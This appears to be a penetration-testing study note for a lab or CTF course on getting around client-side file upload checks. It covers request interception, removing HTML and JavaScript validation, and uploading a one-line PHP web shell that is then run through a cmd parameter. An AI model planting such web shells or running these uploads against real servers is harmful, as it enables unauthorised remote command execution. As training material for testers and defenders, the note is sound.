# File Upload Attacks – Client-Side Validation

## Overview

Many web applications rely on **client-side JavaScript validation** to restrict uploaded file types.

Common example:

- profile picture upload only allows images
- upload button disabled if file is not `.jpg`, `.jpeg`, `.png`
- error message shown for invalid file types

However, client-side validation runs **inside the browser**, meaning we have full control over it.

Because the server ultimately decides whether a file is accepted, client-side validation alone is **not a security control**.

Client-side validation can be bypassed by:

1. modifying the HTTP request directly
2. modifying browser-executed JavaScript
3. altering HTML form attributes
4. intercepting requests with a proxy

Think of client-side validation as a polite suggestion rather than a locked door.

---

# 1. How Client-Side Validation Works

Client-side validation usually uses:

- JavaScript functions
- HTML input restrictions
- MIME-type filtering
- file extension checks

Typical behaviour:

- file selector restricts allowed extensions
- upload button disabled for invalid files
- error message displayed
- no request sent to server

Example error:

```
Only images are allowed!
```

Important observation:

If the page does not refresh or send an HTTP request after selecting a file, validation is likely happening entirely on the client-side.

---

# 2. Why Client-Side Validation Fails

All client-side code executes in the user's browser.

We control:

- browser behaviour
- JavaScript execution
- HTML structure
- HTTP requests sent to server

This means we can:

- disable validation
- modify validation logic
- bypass validation entirely
- send arbitrary file types to server

If the server does not validate file types independently, malicious uploads become possible.

---

# 3. Identifying Client-Side File Restrictions

Common indicators:

- file picker restricts extensions
- certain file types greyed out
- upload button disabled
- immediate error message shown
- no request visible in proxy history

Example restricted input field:

```html
<input type="file" name="uploadFile" id="uploadFile" onchange="checkFile(this)" accept=".jpg,.jpeg,.png">
```

Important attributes:

### accept=
Restricts selectable file types in the browser dialog.

```html
accept=".jpg,.jpeg,.png"
```

### onchange=
Triggers JavaScript validation function.

```html
onchange="checkFile(this)"
```

---

# 4. Method 1 – Modifying the HTTP Request

Instead of using the browser UI normally, intercept the upload request and modify it.

Tools commonly used:

- Burp Suite
- OWASP ZAP
- browser proxy tools

Typical upload request:

```
POST /upload.php HTTP/1.1
Content-Type: multipart/form-data
```

Important fields:

```
filename="HTB.png"
```

and file content at the end of request.

We can modify:

- filename
- file extension
- file content

Example modification:

Change:

```
filename="image.png"
```

to:

```
filename="shell.php"
```

Replace file contents with web shell code:

```php
<?php system($_REQUEST['cmd']); ?>
```

If the server does not validate file type, the upload succeeds.

Server response:

```
File successfully uploaded
```

We can then browse to the uploaded file and execute commands.

---

# 5. Important Request Components

Key parts of upload request:

## filename parameter

```
filename="shell.php"
```

## file content

```php
<?php system($_REQUEST['cmd']); ?>
```

## optional Content-Type header

```
Content-Type: image/png
```

Content-Type can sometimes be left unchanged.

Many servers rely only on extension validation, making bypass simple.

---

# 6. Method 2 – Disabling JavaScript Validation

Because validation occurs locally, we can modify the HTML or JavaScript directly.

Open browser developer tools:

```
CTRL + SHIFT + C
```

Inspect upload element.

Example HTML:

```html
<input type="file" name="uploadFile" id="uploadFile" onchange="checkFile(this)" accept=".jpg,.jpeg,.png">
```

JavaScript validation function:

```javascript
function checkFile(File) {
    if (extension !== 'jpg' && extension !== 'jpeg' && extension !== 'png') {
        $('#error_message').text("Only images are allowed!");
        File.form.reset();
        $("#submit").attr("disabled", true);
    }
}
```

Validation logic:

- checks file extension
- displays error message
- disables upload button

---

# 7. Removing Validation in Browser

We can modify page elements locally.

Steps:

1. open inspector
2. locate file input element
3. remove validation function

Original:

```html
onchange="checkFile(this)"
```

Modified:

```html
<input type="file" name="uploadFile" id="uploadFile">
```

Optional change:

Remove file restriction:

```html
accept=".jpg,.jpeg,.png"
```

Modified version:

```html
<input type="file" name="uploadFile" id="uploadFile">
```

Now we can select any file type directly.

---

# 8. Important Notes About Client-Side Changes

Changes made through dev tools:

- are temporary
- only affect local browser
- disappear after page refresh

However, persistence is not required.

We only need validation disabled long enough to upload the malicious file.

---

# 9. Locating Uploaded File

After successful upload, identify file location.

Using inspector:

```
CTRL + SHIFT + C
```

Locate image source:

```html
<img src="/profile_images/shell.php" class="profile-image">
```

Navigate to file:

```
http://<SERVER_IP>:<PORT>/profile_images/shell.php
```

Execute command:

```
http://<SERVER_IP>:<PORT>/profile_images/shell.php?cmd=id
```

---

# 10. Comparing Bypass Methods

## Request modification advantages

- reliable
- works even if UI heavily restricted
- useful for automation
- allows precise control over upload data

## Request modification limitations

- requires proxy tooling
- requires understanding HTTP structure

---

## Front-end modification advantages

- quick
- no proxy required
- useful for simple validation bypass

## Front-end modification limitations

- changes reset on refresh
- JavaScript may be obfuscated
- validation logic may be complex

---

# 11. Practical Exploitation Workflow

## Step 1 – attempt normal upload

Observe restrictions.

## Step 2 – inspect upload element

Identify validation functions.

## Step 3 – intercept request or modify page

Bypass restrictions.

## Step 4 – upload web shell

Confirm successful upload.

## Step 5 – locate uploaded file

Inspect page source.

## Step 6 – execute commands

Confirm RCE capability.

---

# 12. Quick Techniques

## open inspector

```
CTRL + SHIFT + C
```

## open console

```
CTRL + SHIFT + K
```

## remove validation function

```html
onchange="checkFile(this)"
```

## remove file restrictions

```html
accept=".jpg,.jpeg,.png"
```

## example PHP shell

```php
<?php system($_REQUEST['cmd']); ?>
```

## execute command

```
http://<SERVER_IP>:<PORT>/profile_images/shell.php?cmd=whoami
```

---

# 13. Key Takeaways

- client-side validation is not a security control
- browser executes validation code locally
- HTTP requests can be modified to bypass restrictions
- JavaScript validation can be removed or altered
- file extension checks are easily bypassed
- server-side validation determines true security
- client-side protections are useful indicators but not barriers

---

# Tags

#file-upload
#client-side-validation
#bypass
#burp
#javascript
#web-shell
#rce
#pentesting
#ctf
#obsidian